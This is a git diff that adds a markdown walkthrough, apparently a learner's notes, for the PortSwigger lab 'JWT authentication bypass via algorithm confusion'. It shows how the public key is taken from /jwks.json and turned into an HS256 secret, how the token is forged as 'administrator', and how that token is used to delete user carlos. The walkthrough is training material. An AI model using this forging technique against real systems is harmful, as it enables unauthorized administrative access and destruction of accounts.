@@ -1051,7 +1051,129 @@ eyJraWQiOiJlZDZjYmIwYy03MDdhLTQ3MGYtYmYzOS01NjQwOTU3YTYwMGMiLCJhbGciOiJIUzI1NiJ9
 
 
 
+<details>
+    <summary>🟪 Lab: JWT authentication bypass via algorithm confusion</summary>
 
+
+```json
+eyJraWQiOiI1NmJhMDQwMS0wY2YxLTQ2ZWYtYmU3MC1mZjQ2YjRmMDQ4ZDUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1NjU3NTQxNSwic3ViIjoid2llbmVyIn0.Fsyamv_6kZjYpwflHMFrYTML2zMm8XBvXQDYD8DagoZBGD-ySWFOT6kYQT_eJYFbM-5Q0Vs-LvOILYB2R_e8VVBLuzpvIMj4M-a8GsKH5z8XNdqdfRBTcYUsOgyD3Xx2FbdBTqWuiWck9MevfjtrHnwKz9FUegrWK_7iQN27jEMdH5xutxpFaFAAYxAavL555BjXpkRSO5ScyGO98pM4fCTUXApckpp1PL5bD3QIXnb0_TLSN_o9WONVC82GlOYMWmHfViLp34QrYv7yLu1fJpbsNud4p311-9itYmHE4tLvXA0gZjKmVDCKYLA7nkn-baatBifpVaZXtM1_hcgnfw
+```
+
+---
+
+<img width="743" height="624" alt="image" src="https://github.com/user-attachments/assets/8e455224-e54d-4971-a1d8-9c02c52e658a" />
+
+---
+
+> ## navgaite this path to find the public key: 
+
+```url
+/jwks.json
+```
+
+<img width="1915" height="191" alt="image" src="https://github.com/user-attachments/assets/5ce7067d-7b54-48c9-a20f-bc0b4c0e3b5c" />
+
+```json
+{
+
+   "kty":"RSA",
+   "e":"AQAB",
+   "use":"sig",
+   "kid":"56ba0401-0cf1-46ef-be70-ff46b4f048d5",
+"alg":"RS256",
+"n":"0qKD9zA7BuRjcJ9sNVDer2ofx9ja0fLGrz11FSy3Tz6R6FOX0oaAIX89YzJY3d38nvQc1zdHsZRgFNsQDWZJeTTlpce_j_6wfCpatzwigNfEsygPmMG27pLC1xAJzEdAv7Z5WITQM8ReJF-2U91qB02a8a5uG3MWPZEX0GTjDZroTTCPEhaDjHeRlRZ10aoUN0P4Bw5zF8s1KorJvU1mq6NzM1_LVxa-lza9yAJ4xDbsjvgJ7mTQoHCRn9fmtNwpzdPJHXEs9LmCfMFGZil6h1haO9yBOz0IHcyL9DMUBRa4b64nUySd44H9QoEaSntrBIxDrdUsHhhdWhi9XsU1GQ"
+
+}
+```
+
+> ## go to **``JWT editor``** click generate **RSA key** and paste the publick key 
+
+<img width="1906" height="624" alt="image" src="https://github.com/user-attachments/assets/0d12fc3f-b762-46d2-b964-78f6d4f637e3" />
+
+> ## now click **`copy public key as PEM`**
+
+<img width="891" height="367" alt="image" src="https://github.com/user-attachments/assets/1a62ed7c-865a-462b-adf3-badc59b3f68b" />
+
+```
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0qKD9zA7BuRjcJ9sNVDe
+r2ofx9ja0fLGrz11FSy3Tz6R6FOX0oaAIX89YzJY3d38nvQc1zdHsZRgFNsQDWZJ
+eTTlpce/j/6wfCpatzwigNfEsygPmMG27pLC1xAJzEdAv7Z5WITQM8ReJF+2U91q
+B02a8a5uG3MWPZEX0GTjDZroTTCPEhaDjHeRlRZ10aoUN0P4Bw5zF8s1KorJvU1m
+q6NzM1/LVxa+lza9yAJ4xDbsjvgJ7mTQoHCRn9fmtNwpzdPJHXEs9LmCfMFGZil6
+h1haO9yBOz0IHcyL9DMUBRa4b64nUySd44H9QoEaSntrBIxDrdUsHhhdWhi9XsU1
+GQIDAQAB
+-----END PUBLIC KEY-----
+```
+
+> ## go to **`Decoder`** and encode it to ``base64``
+
+<img width="1899" height="433" alt="image" src="https://github.com/user-attachments/assets/9d50a579-9a4f-49bd-9095-935aa209500e" />
+
+```base64
+LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEwcUtEOXpBN0J1UmpjSjlzTlZEZQpyMm9meDlqYTBmTEdyejExRlN5M1R6NlI2Rk9YMG9hQUlYODlZekpZM2QzOG52UWMxemRIc1pSZ0ZOc1FEV1pKCmVUVGxwY2Uvai82d2ZDcGF0endpZ05mRXN5Z1BtTUcyN3BMQzF4QUp6RWRBdjdaNVdJVFFNOFJlSkYrMlU5MXEKQjAyYThhNXVHM01XUFpFWDBHVGpEWnJvVFRDUEVoYURqSGVSbFJaMTBhb1VOMFA0Qnc1ekY4czFLb3JKdlUxbQpxNk56TTEvTFZ4YStsemE5eUFKNHhEYnNqdmdKN21UUW9IQ1JuOWZtdE53cHpkUEpIWEVzOUxtQ2ZNRkdaaWw2CmgxaGFPOXlCT3owSUhjeUw5RE1VQlJhNGI2NG5VeVNkNDRIOVFvRWFTbnRyQkl4RHJkVXNIaGhkV2hpOVhzVTEKR1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tUwo=
+```
+
+> ## now create new **`symetric key`** replace the **`k`** value to **`base64`**
+
+<img width="1027" height="649" alt="image" src="https://github.com/user-attachments/assets/e0385aee-d2b2-4139-94e1-820f7b0f14eb" />
+
+
+> ## now we can used the ``public key`` as ``secet key``
+
+> ## now go back to repeater change the jwt header and payload :
+
+## **`from`**
+
+```json
+{
+    "kid": "56ba0401-0cf1-46ef-be70-ff46b4f048d5",
+    "alg": "RS256"
+}
+
+{
+    "iss": "portswigger",
+    "exp": 1756575415,
+    "sub": "wiener"
+}
+```
+
+## **`To`**
+
+```json
+{
+    "kid": "56ba0401-0cf1-46ef-be70-ff46b4f048d5",
+    "alg": "HS256"
+}
+
+{
+    "iss": "portswigger",
+    "exp": 1756575415,
+    "sub": "administrator"
+}
+
+```
+
+
+> ## click **`sign`** button 
+
+ <img width="1053" height="548" alt="image" src="https://github.com/user-attachments/assets/34ca7b0c-5166-40cd-93c0-dea6c4929f04" />
+
+> ## send the request
+
+<img width="1507" height="738" alt="image" src="https://github.com/user-attachments/assets/66402479-c12b-4cf3-bbee-4f1060d4bc75" />
+
+
+> change path to **`GET /admin/delete?username=carlos HTTP/2`**
+
+<img width="1520" height="750" alt="image" src="https://github.com/user-attachments/assets/d7b5a639-6418-44db-9dbb-f1ad39250aed" />
+
+
+
+
+
+    
+</details>
 
 
 
